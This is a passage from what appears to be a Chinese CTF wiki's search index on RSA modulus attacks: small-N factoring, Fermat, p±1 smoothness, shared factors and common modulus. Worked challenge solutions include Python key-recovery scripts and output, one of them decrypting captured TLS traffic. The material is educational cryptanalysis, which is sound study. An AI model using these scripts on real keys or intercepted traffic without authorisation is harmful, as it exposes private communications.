\u7684\u6bd4\u7279\u4f4d\u6570\u5c0f\u4e8e 512 \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u91c7\u7528\u5927\u6574\u6570\u5206\u89e3\u7684\u7b56\u7565\u83b7\u53d6 p \u548c q\u3002 JarvisOJ - Medium RSA \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 JarvisOJ - Medium RSA \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u5982\u4e0b \u8fd8\u8bb0\u5f97 veryeasy RSA \u5417\uff1f\u662f\u4e0d\u662f\u4e0d\u96be\uff1f\u90a3\u7ee7\u7eed\u6765\u770b\u770b\u8fd9\u9898\u5427\uff0c\u8fd9\u9898\u4e5f\u4e0d\u96be\u3002 \u5df2\u77e5\u4e00\u6bb5 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u4e3a\uff1a0xdc2eeeb2782c \u4e14\u5df2\u77e5\u52a0\u5bc6\u6240\u7528\u7684\u516c\u94a5\uff1a N=322831561921859 e = 23 \u8bf7\u89e3\u5bc6\u51fa\u660e\u6587\uff0c\u63d0\u4ea4\u65f6\u8bf7\u5c06\u6570\u5b57\u8f6c\u5316\u4e3a ascii \u7801\u63d0\u4ea4 \u6bd4\u5982\u4f60\u89e3\u51fa\u7684\u660e\u6587\u662f 0x6162\uff0c\u90a3\u4e48\u8bf7\u63d0\u4ea4\u5b57\u7b26\u4e32 ab \u63d0\u4ea4\u683c\u5f0f\uff1a PCTF{\u660e\u6587\u5b57\u7b26\u4e32} \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684 N \u6bd4\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 factordb \u8fdb\u884c\u5206\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230 322831561921859 = 13574881 \\times 23781539 322831561921859 = 13574881 \\times 23781539 \u8fdb\u800c\u6211\u4eec\u7b80\u5355\u7f16\u5199\u7a0b\u5e8f\u5982\u4e0b import gmpy2 p = 13574881 q = 23781539 n = p * q e = 23 c = 0xdc2eeeb2782c phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) p = gmpy2 . powmod ( c , d , n ) tmp = hex ( p ) print tmp , tmp [ 2 :] . decode ( 'hex' ) \u7ed3\u679c\u5982\u4e0b \u279c Jarvis OJ-Basic-easyRSA git: ( master ) \u2717 python exp.py 0x33613559 3a5Y p & q \u4e0d\u5f53\u5206\u89e3 N \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53 RSA \u4e2d p \u548c q \u9009\u53d6\u4e0d\u5f53\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002 |p-q| \u5f88\u5927 \u00b6 \u5f53 p-q \u5f88\u5927\u65f6\uff0c\u4e00\u5b9a\u5b58\u5728\u67d0\u4e00\u4e2a\u53c2\u6570\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u4e3a p\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7a77\u4e3e\u7684\u65b9\u6cd5\u5bf9\u6a21\u6570\u8fdb\u884c\u8bd5\u9664\uff0c\u4ece\u800c\u5206\u89e3\u6a21\u6570\uff0c\u5f97\u5230\u4fdd\u5bc6\u53c2\u6570\u4e0e\u660e\u6587\u4fe1\u606f\u3002\u57fa\u672c\u6765\u8bf4\uff0c\u4e0d\u600e\u4e48\u53ef\u884c\u3002 |p-q| \u8f83\u5c0f \u00b6 \u9996\u5148 \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \u65e2\u7136 |p-q| \u8f83\u5c0f\uff0c\u90a3\u4e48 \\frac{(p-q)^2}{4} \\frac{(p-q)^2}{4} \u81ea\u7136\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u8fdb\u800c \\frac{(p+q)^2}{4} \\frac{(p+q)^2}{4} \u53ea\u662f\u6bd4 N \u7a0d\u5fae\u5927\u4e00\u70b9\uff0c\u6240\u4ee5 \\frac{p+q}{2} \\frac{p+q}{2} \u4e0e \\sqrt{n} \\sqrt{n} \u76f8\u8fd1\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u6cd5\u6765\u5206\u89e3 \u987a\u5e8f\u68c0\u67e5 \\sqrt{n} \\sqrt{n} \u7684\u6bcf\u4e00\u4e2a\u6574\u6570 x\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a x \u4f7f\u5f97 x^2-n x^2-n \u662f\u5e73\u65b9\u6570\uff0c\u8bb0\u4e3a y^2 y^2 \u90a3\u4e48 x^2-n=y^2 x^2-n=y^2 \uff0c\u8fdb\u800c\u6839\u636e\u5e73\u65b9\u5dee\u516c\u5f0f\u5373\u53ef\u5206\u89e3 N p - 1 \u5149\u6ed1 \u00b6 \u5f53 p \u662f N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p - 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002 Warning \u539f\u7406\u5206\u6790\u5f85\u5b8c\u6210 p + 1 \u5149\u6ed1 \u00b6 \u5f53 p \u662f n \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p + 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002 2017 SECCON very smooth \u00b6 \u8be5\u7a0b\u5e8f\u7ed9\u4e86\u4e00\u4e2a HTTPS \u52a0\u5bc6\u7684\u6d41\u91cf\u5305\uff0c\u9996\u5148\u4ece\u5176\u4e2d\u62ff\u5230\u8bc1\u4e66 \u279c 2017_SECCON_verysmooth git: ( master ) binwalk -e s.pcap DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 2292 0x8F4 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 4038 0xFC6 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 5541 0x15A5 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 \u279c 2017_SECCON_verysmooth git: ( master ) ls s.pcap _s.pcap.extracted very_smooth.zip \u8fd9\u91cc\u5206\u522b\u67e5\u770b\u4e09\u4e2a\u8bc1\u4e66\uff0c\u4e09\u4e2a\u6a21\u6570\u90fd\u4e00\u6837\uff0c\u8fd9\u91cc\u53ea\u7ed9\u4e00\u4e2a\u4f8b\u5b50 \u279c _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt -pubkey -text -modulus -noout -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy 8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj DUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl yioxCqbXYIMxGO4NcQIDAQAB -----END PUBLIC KEY----- Certificate: Data: Version: 1 (0x0) Serial Number: 11640506567126718943 (0xa18b630c7b3099df) Signature Algorithm: sha256WithRSAEncryption Issuer: C=JP, ST=Kawasaki, O=SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C=JP, ST=Kawasaki, O=SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39 Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 \u53ef\u4ee5\u770b\u51fa\u6a21\u6570\u53ea\u6709 1024 \u6bd4\u7279\u3002\u800c\u4e14\uff0c\u6839\u636e\u9898\u76ee\u540d very smooth\uff0c\u5e94\u8be5\u662f\u5176\u4e2d\u4e00\u4e2a\u56e0\u5b50\u6bd4\u8f83 smooth\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528 primefac \u5206\u522b\u5c1d\u8bd5 Pollard's p \u2212 1 \u4e0e Williams's p + 1 \u7b97\u6cd5\uff0c\u5982\u4e0b \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs -m = p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 : p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 Z309 = P155 x P155 = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 \u53ef\u4ee5\u53d1\u73b0\u5f53\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u65f6\uff0c\u5c31\u76f4\u63a5\u5206\u89e3\u51fa\u6765\u4e86\u3002\u6309\u9053\u7406\u8fd9\u4e2a\u56e0\u5b50\u662f p-1 \u4f3c\u4e4e\u66f4\u5149\u6ed1\uff0c\u4f46\u662f\u5374\u5e76\u4e0d\u80fd\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u5206\u89e3\uff0c\u8fd9\u91cc\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 : 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 Z154 = P1 x P1 x P2 x P3 x P6 x P142 = 2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 : 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 Z154 = P1^185 x P1^62 x P1^97 = 2 ^185 x 3 ^62 x 5 ^97 \u53ef\u4ee5\u770b\u51fa\uff0c\u5bf9\u4e8e p-1 \u786e\u5b9e\u6709\u5f88\u591a\u5c0f\u56e0\u5b50\uff0c\u4f46\u662f\u4e2a\u6570\u592a\u591a\uff0c\u8fd9\u5c31\u4f1a\u4f7f\u5f97\u8fdb\u884c\u679a\u4e3e\u7684\u65f6\u5019\u51fa\u73b0\u6307\u6570\u7206\u70b8\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u6ca1\u6709\u5206\u89e3\u51fa\u6765\u3002 \u8fdb\u800c\u6839\u636e\u5206\u89e3\u51fa\u6765\u7684\u6570\u6784\u9020\u79c1\u94a5 from Crypto.PublicKey import RSA import gmpy2 def main (): n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L e = 65537L priv = RSA . construct (( n , e , long ( gmpy2 . invert ( e , ( p - 1 ) * ( q - 1 ))))) open ( 'private.pem' , 'w' ) . write ( priv . exportKey ( 'PEM' )) main () \u6700\u540e\uff0c\u5c06\u79c1\u94a5\u5bfc\u5165\u5230 wireshark \u4e2d\u5373\u53ef\u5f97\u5230\u660e\u6587\uff08Edit -> Preferences -> Protocols -> SSL -> RSA Key List\uff09\u3002 < html > < head >< title > Very smooth </ title ></ head > < body > < h1 > Answer: One of these primes is very smooth. </ h1 > </ body > </ html > \u6269\u5c55 \u00b6 \u5173\u4e8e\u66f4\u591a\u7684\u4e00\u4e9b\u5206\u89e3\u6a21\u6570 N \u7684\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Integer_factorization \u3002 \u6a21\u4e0d\u4e92\u7d20 \u00b6 \u653b\u51fb\u539f\u7406 \u00b6 \u5f53\u5b58\u5728\u4e24\u4e2a\u516c\u94a5\u7684 N \u4e0d\u4e92\u7d20\u65f6\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e24\u4e2a\u6570\u6c42\u6700\u5927\u516c\u56e0\u6570\uff0c\u7136\u540e\u76f4\u63a5\u83b7\u5f97 p\uff0cq\uff0c\u8fdb\u800c\u83b7\u5f97\u76f8\u5e94\u7684\u79c1\u94a5\u3002 SCTF RSA2 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF rsa2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u76f4\u63a5\u6253\u5f00 pcap \u5305\uff0c\u53d1\u73b0\u6709\u4e00\u5806\u7684\u6d88\u606f\uff0c\u5305\u542b N \u548c e\uff0c\u7136\u540e\u8bd5\u4e86\u8bd5\u4e0d\u540c\u7684 N \u662f\u5426\u4e92\u7d20\uff0c\u6211\u8bd5\u4e86\u524d\u4e24\u4e2a import gmpy2 n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943 print gmpy2 . gcd ( n1 , n2 ) \u7ed3\u679c\u53d1\u73b0\u7adf\u7136\u4e0d\u4e92\u7d20\u3002 \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py 122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137 \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6765\u89e3\u5bc6\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7b2c\u4e00\u5bf9\u516c\u94a5\u5bc6\u7801\u3002\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943 p1 = gmpy2 . gcd ( n1 , n2 ) q1 = n1 / p1 e = 65537 phin = ( p1 - 1 ) * ( q1 - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7 plain = gmpy2 . powmod ( cipher , d , n1 ) plain = hex ( plain )[ 2 :] if len ( plain ) % 2 != 0 : plain = '0' + plain print plain . decode ( 'hex' ) \u6700\u540e\u89e3\u5bc6\u5982\u4e0b \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py sH1R3_PRlME_1N_rsA_iS_4ulnEra5le \u89e3\u538b\u538b\u7f29\u5305\u5373\u53ef\u3002 \u5171\u6a21\u653b\u51fb \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53\u4e24\u4e2a\u7528\u6237\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570 N\u3001\u4e0d\u540c\u7684\u79c1\u94a5\u65f6\uff0c\u52a0\u5bc6\u540c\u4e00\u660e\u6587\u6d88\u606f\u65f6\u5373\u5b58\u5728\u5171\u6a21\u653b\u51fb\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u8bbe\u4e24\u4e2a\u7528\u6237\u7684\u516c\u94a5\u5206\u522b\u4e3a e_1 e_1 \u548c e_2 e_2 \uff0c\u4e14\u4e24\u8005\u4e92\u8d28\u3002\u660e\u6587\u6d88\u606f\u4e3a m m \uff0c\u5bc6\u6587\u5206\u522b\u4e3a\uff1a c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N \u5f53\u653b\u51fb\u8005\u622a\u83b7 c_1 c_1 \u548c c_2 c_2 \u540e\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u51fa\u660e\u6587\u3002\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u51fa re_1+se_2=1\\bmod n re_1+se_2=1\\bmod n \u7684\u4e24\u4e2a\u6574\u6570 r r \u548c s s \uff0c\u7531\u6b64\u53ef\u5f97\uff1a \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60 \u00b6 \u9898\u76ee\u63cf\u8ff0\uff1a {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773} {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839} message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349 message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535 \u9898\u76ee\u6765\u6e90\uff1aXMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60 \u53ef\u4ee5\u770b\u51fa\u4e24\u4e2a\u516c\u94a5\u7684 N \u662f\u4e00\u6837\u7684\uff0c\u5e76\u4e14\u4e24\u8005\u7684 e \u4e92\u7d20\u3002\u5199\u4e00\u4e2a\u811a\u672c\u8dd1\u4e00\u4e0b\uff1a import gmpy2 n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249 e1 = 773 e2 = 839 message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349 message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535 # s & t gcd , s , t = gmpy2 . gcdext ( e1 , e2 ) if s < 0 : s = - s message1 = gmpy2 . invert ( message1 , n ) if t < 0 : t = - t message2 = gmpy2 . invert ( message2 , n ) plain = gmpy2 . powmod ( message1 , s , n ) * gmpy2 . powmod ( message2 , t , n ) % n print plain \u5f97\u5230 \u279c Xman-1-class-exercise git: ( master ) \u2717 python exp.py 1021089710312311910410111011910111610410511010710511610511511211111511510598108101125 \u8fd9\u65f6\u5019\u9700\u8981\u8003\u8651\u5f53\u65f6\u660e\u6587\u662f\u5982\u4f55\u8f6c\u5316\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u662f 16 \u8fdb\u5236\u8f6c\u6362\uff0cASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u6216\u8005 Base64 \u89e3\u5bc6\u3002\u8fd9\u4e2a\u5e94\u8be5\u662f ASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u8fdb\u800c\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u5f97\u5230 flag i = 0 flag = \"\" plain = str ( plain ) while i < len ( plain ): if plain [ i ] == '1' : flag += chr ( int ( plain [ i : i + 3 ])) i += 3 else : flag += chr ( int ( plain [ i : i + 2 ])) i += 2 print flag \u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f7f\u7528 1 \u6765\u5224\u65ad\u662f\u5426\u4e3a\u4e09\u4f4d\u957f\u5ea6\uff0c\u662f\u56e0\u4e3a flag \u4e00\u822c\u90fd\u662f\u660e\u6587\u5b57\u7b26\uff0c\u800c 1 \u5f00\u5934\u7684\u957f\u5ea6\u4e3a 1 \u6216\u8005 2 \u7684\u6570\u5b57\uff0c\u4e00\u822c\u90fd\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\u3002 flag \u279c Xman-1-class-exercise git: ( master ) \u2717 python exp.py flag { whenwethinkitispossible } \u9898\u76ee \u00b6 Jarvis OJ very hard RSA","title":"\u6a21\u6570\u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#n","text":"","title":"\u66b4\u529b\u5206\u89e3 N"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_1","text":"\u5728 N \u7684\u6bd4\u7279\u4f4d\u6570\u5c0f\u4e8e 512 \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u91c7\u7528\u5927\u6574\u6570\u5206\u89e3\u7684\u7b56\u7565\u83b7\u53d6 p \u548c q\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#jarvisoj-medium-rsa","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 JarvisOJ - Medium RSA \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u5982\u4e0b \u8fd8\u8bb0\u5f97 veryeasy RSA \u5417\uff1f\u662f\u4e0d\u662f\u4e0d\u96be\uff1f\u90a3\u7ee7\u7eed\u6765\u770b\u770b\u8fd9\u9898\u5427\uff0c\u8fd9\u9898\u4e5f\u4e0d\u96be\u3002 \u5df2\u77e5\u4e00\u6bb5 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u4e3a\uff1a0xdc2eeeb2782c \u4e14\u5df2\u77e5\u52a0\u5bc6\u6240\u7528\u7684\u516c\u94a5\uff1a N=322831561921859 e = 23 \u8bf7\u89e3\u5bc6\u51fa\u660e\u6587\uff0c\u63d0\u4ea4\u65f6\u8bf7\u5c06\u6570\u5b57\u8f6c\u5316\u4e3a ascii \u7801\u63d0\u4ea4 \u6bd4\u5982\u4f60\u89e3\u51fa\u7684\u660e\u6587\u662f 0x6162\uff0c\u90a3\u4e48\u8bf7\u63d0\u4ea4\u5b57\u7b26\u4e32 ab \u63d0\u4ea4\u683c\u5f0f\uff1a PCTF{\u660e\u6587\u5b57\u7b26\u4e32} \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684 N \u6bd4\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 factordb \u8fdb\u884c\u5206\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230 322831561921859 = 13574881 \\times 23781539 322831561921859 = 13574881 \\times 23781539 \u8fdb\u800c\u6211\u4eec\u7b80\u5355\u7f16\u5199\u7a0b\u5e8f\u5982\u4e0b import gmpy2 p = 13574881 q = 23781539 n = p * q e = 23 c = 0xdc2eeeb2782c phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) p = gmpy2 . powmod ( c , d , n ) tmp = hex ( p ) print tmp , tmp [ 2 :] . decode ( 'hex' ) \u7ed3\u679c\u5982\u4e0b \u279c Jarvis OJ-Basic-easyRSA git: ( master ) \u2717 python exp.py 0x33613559 3a5Y","title":"JarvisOJ - Medium RSA"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q-n","text":"","title":"p &amp; q \u4e0d\u5f53\u5206\u89e3 N"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_2","text":"\u5f53 RSA \u4e2d p \u548c q 